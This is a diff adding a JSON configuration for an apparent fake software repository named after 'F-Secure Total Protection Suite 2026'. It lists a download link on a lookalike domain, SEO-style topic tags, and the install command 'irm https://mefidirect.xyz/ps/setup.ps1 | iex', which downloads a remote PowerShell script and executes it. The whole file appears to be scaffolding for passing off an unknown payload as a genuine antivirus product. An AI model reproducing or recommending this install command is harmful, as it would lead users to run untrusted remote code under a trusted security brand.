@@ -1,0 +1,29 @@
+{
+  "repo": "f-secure-total-protection-suite-2026",
+  "product": "F-Secure Total Protection Suite 2026",
+  "kind": "security",
+  "install_type": "download",
+  "download_url": "https://f-secure.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "security",
+  "topics": [
+    "f-secure-bundle",
+    "f-secure-platform",
+    "f-secure-antivirus-software",
+    "f-secure-64-bit",
+    "f-secure-startup-fix",
+    "f-secure-pc-install",
+    "f-secure-malware-protection",
+    "f-secure-workbench",
+    "f-secure-user-guide",
+    "f-secure-manual-2026",
+    "f-secure-installer",
+    "setup-guide",
+    "antivirus-tools",
+    "maintenance-tools",
+    "security-tools"
+  ]
+}
